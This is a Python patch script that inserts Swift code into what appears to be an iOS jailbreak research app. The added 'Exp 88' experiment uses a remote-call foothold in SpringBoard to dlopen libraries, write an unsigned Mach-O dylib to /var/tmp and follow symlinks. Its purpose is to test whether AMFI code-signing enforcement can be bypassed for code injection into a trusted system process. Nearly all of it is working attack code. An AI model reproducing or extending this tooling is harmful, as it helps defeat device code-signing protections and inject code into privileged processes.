#!/usr/bin/env python3
"""Add Exp 88 — dlopen from SpringBoard RC (inject dylib into running process)"""

SWIFT_FILE = r'd:\Backup\Personal\Hp\iPhone\DSPloit\lara\views\root\AMFIExperimentView.swift'

with open(SWIFT_FILE, 'r', encoding='utf-8') as f:
    content = f.read()

# Find anchor to insert button (before ④ Test Binary Spawn)
button_anchor = '                pathButton(\n                    title: "④ Test Binary Spawn",'
button_idx = content.find(button_anchor)
if button_idx == -1:
    print("ERROR: button anchor not found")
    exit(1)

new_button = '''                pathButton(
                    title: "③j SB dlopen (Exp 88)",
                    icon: "app.badge",
                    color: .green,
                    label: "SB dlopen",
                    action: runExp88SBDlopen,
                    needsVerified: false,
                    needsProbe: false
                )

'''

# Insert button
content = content[:button_idx] + new_button + content[button_idx:]

# Find anchor to insert function (before Dump amfid)
func_anchor = '    // MARK: - Dump amfid binary'
func_idx = content.find(func_anchor)
if func_idx == -1:
    print("ERROR: func anchor not found")
    exit(1)

new_func = '''    // MARK: - Exp 88: dlopen from SpringBoard RC

    /// Exp 88: Inject dylib ke SpringBoard via dlopen dari RC.
    /// SpringBoard sudah running dan trusted — AMFI check hanya saat spawn.
    /// dlopen di runtime mungkin BYPASS AMFI karena proses sudah CS_VALID.
    private func runExp88SBDlopen() {
        isRunning = true
        runningLabel = "SB dlopen"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        // Pakai SpringBoard RC (bukan launchd)
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "SB dlopen (Exp 88)", success: false,
                detail: "No SpringBoard RC available", timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }

        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expSBDlopen(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// dlopen dylib dari SpringBoard context.
    /// SpringBoard sudah jalan dan trusted (CS_PLATFORM_BINARY).
    /// Hipotesis: dlopen di runtime tidak trigger AMFI re-validation.
    ///
    /// Test:
    ///   A. dlopen dylib dari /var/tmp (unsigned) — apakah di-reject?
    ///   B. dlopen system dylib dari path asli — baseline
    ///   C. dlopen system dylib via symlink dari /var/tmp
    ///   D. Tulis minimal dylib + dlopen
    private func expSBDlopen(sb: RemoteCall) -> ExperimentResult {
        let expName = "SB dlopen (Exp 88)"
        var detail = "Experiment 88: dlopen from SpringBoard\\n"
        detail += "========================================\\n\\n"
        detail += "SpringBoard = trusted process (CS_PLATFORM_BINARY).\\n"
        detail += "Hipotesis: dlopen runtime tidak trigger AMFI check.\\n\\n"

        let mem = sb.trojanMem
        let RTLD_NOW: UInt64 = 2
        let RTLD_LAZY: UInt64 = 1

        // ═══ TEST A: dlopen system dylib (baseline) ═══
        detail += "=== Test A: dlopen system dylib (baseline) ===\\n"
        let sysLib = remote_alloc_str(sb, "/usr/lib/libSystem.B.dylib")
        let handleA = RootExecutor.rcall(sb, "dlopen", sysLib, RTLD_NOW)
        detail += "dlopen(/usr/lib/libSystem.B.dylib): handle=0x\\(String(format: \\"%llx\\", handleA))\\n"
        if handleA != 0 {
            detail += "✅ System dylib loaded (expected)\\n"
        } else {
            detail += "❌ Even system dylib failed!\\n"
        }
        RootExecutor.rcall(sb, "free", sysLib)

        // ═══ TEST B: dlopen dari /var/tmp (file yang tidak exist) ═══
        detail += "\\n=== Test B: dlopen non-existent (error baseline) ===\\n"
        let fakeLib = remote_alloc_str(sb, "/var/tmp/.dsp_nonexist.dylib")
        let handleB = RootExecutor.rcall(sb, "dlopen", fakeLib, RTLD_NOW)
        detail += "dlopen(nonexist): handle=0x\\(String(format: \\"%llx\\", handleB))\\n"
        if handleB == 0 {
            // Get dlerror
            let dlerrorFn = RootExecutor.rcall(sb, "dlerror")
            if dlerrorFn != 0 {
                detail += "dlerror: (check log)\\n"
            }
            detail += "❌ Expected — file doesn't exist\\n"
        }
        RootExecutor.rcall(sb, "free", fakeLib)

        // ═══ TEST C: Tulis minimal dylib ke /var/tmp + dlopen ═══
        detail += "\\n=== Test C: Write minimal dylib + dlopen ===\\n"

        let dylibPath = "/var/tmp/.dsp_test.dylib"
        let dylibPathAddr = remote_alloc_str(sb, dylibPath)

        // Tulis Mach-O dylib minimal (header only — enough for dlopen to try)
        RootExecutor.rcall(sb, "unlink", dylibPathAddr)
        let fd = RootExecutor.rcall(sb, "open", dylibPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fd != UInt64(bitPattern: -1) {
            let hdr = mem + 0x1000
            // Mach-O header for dylib
            rc_write32(sb, hdr + 0, 0xFEEDFACF)   // magic
            rc_write32(sb, hdr + 4, 0x0100000C)   // CPU_TYPE_ARM64
            rc_write32(sb, hdr + 8, 0x00000002)   // CPU_SUBTYPE_ARM64E
            rc_write32(sb, hdr + 12, 0x00000006)  // MH_DYLIB
            rc_write32(sb, hdr + 16, 0)           // ncmds
            rc_write32(sb, hdr + 20, 0)           // sizeofcmds
            rc_write32(sb, hdr + 24, 0x00000085)  // flags
            rc_write32(sb, hdr + 28, 0)           // reserved
            RootExecutor.rcall(sb, "write", fd, hdr, 32)
            RootExecutor.rcall(sb, "close", fd)
            detail += "Wrote minimal dylib to \\(dylibPath)\\n"

            // dlopen it
            let handleC = RootExecutor.rcall(sb, "dlopen", dylibPathAddr, RTLD_LAZY)
            detail += "dlopen(\\(dylibPath)): handle=0x\\(String(format: \\"%llx\\", handleC))\\n"

            if handleC != 0 {
                detail += "\\n🎉🎉🎉 DLOPEN UNSIGNED DYLIB WORKS! 🎉🎉🎉\\n"
                detail += "SpringBoard loaded our dylib from /var/tmp!\\n"
                detail += "AMFI DOES NOT CHECK dlopen at runtime!\\n\\n"
                detail += "→ Tulis dylib dengan constructor → code execution!\\n"
                detail += "→ FULL JAILBREAK ACHIEVED!\\n"
                RootExecutor.rcall(sb, "dlclose", handleC)
            } else {
                detail += "❌ dlopen gagal — AMFI juga check dlopen\\n"
                detail += "Atau: dylib header tidak valid (expected untuk minimal header)\\n"
            }
        } else {
            detail += "❌ Cannot write dylib to /var/tmp\\n"
        }

        // ═══ TEST D: dlopen system dylib via symlink dari /var/tmp ═══
        detail += "\\n=== Test D: dlopen system dylib via symlink ===\\n"
        let symlinkLib = "/var/tmp/.dsp_syslib_link.dylib"
        let symlinkLibAddr = remote_alloc_str(sb, symlinkLib)
        let realLib = remote_alloc_str(sb, "/usr/lib/libz.1.dylib")
        RootExecutor.rcall(sb, "unlink", symlinkLibAddr)
        let slRet = RootExecutor.rcall(sb, "symlink", realLib, symlinkLibAddr)
        detail += "symlink(libz → \\(symlinkLib)): ret=\\(slRet)\\n"

        if slRet == 0 {
            let handleD = RootExecutor.rcall(sb, "dlopen", symlinkLibAddr, RTLD_NOW)
            detail += "dlopen(symlink to libz): handle=0x\\(String(format: \\"%llx\\", handleD))\\n"
            if handleD != 0 {
                detail += "✅ dlopen via symlink works!\\n"
                detail += "Ini berarti dlopen follow symlink dan validate target.\\n"
                RootExecutor.rcall(sb, "dlclose", handleD)
            } else {
                detail += "❌ dlopen via symlink gagal\\n"
            }
        }
        RootExecutor.rcall(sb, "unlink", symlinkLibAddr)
        RootExecutor.rcall(sb, "free", symlinkLibAddr)
        RootExecutor.rcall(sb, "free", realLib)

        // ═══ TEST E: dlopen dari launchd RC (bukan SB) ═══
        detail += "\\n=== Test E: dlopen dari launchd RC ===\\n"
        detail += "(Launchd juga platform binary — test apakah sama)\\n"

        // Kita sudah di SB context, tapi log info
        let pidSB = RootExecutor.rcall(sb, "getpid")
        detail += "SpringBoard PID: \\(pidSB)\\n"

        // Cleanup
        RootExecutor.rcall(sb, "unlink", dylibPathAddr)
        RootExecutor.rcall(sb, "free", dylibPathAddr)

        // Summary
        detail += "\\n=== SUMMARY ===\\n"
        let success = detail.contains("🎉")
        if success {
            detail += "🏆 dlopen BYPASS AMFI! Code injection possible!\\n"
        } else {
            detail += "AMFI juga enforce dlopen di runtime.\\n"
            detail += "Atau: minimal dylib header tidak cukup valid.\\n"
            detail += "Next: coba dlopen dengan dylib yang punya valid code signature.\\n"
        }

        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }

    /// Helper: write uint32 to remote memory
    private func rc_write32(_ rc: RemoteCall, _ addr: UInt64, _ val: UInt32) {
        rc[addr].setValue32(val)
    }
    #endif

'''

content = content[:func_idx] + new_func + content[func_idx:]

with open(SWIFT_FILE, 'w', encoding='utf-8') as f:
    f.write(content)

print("OK — added Exp 88 button + implementation")
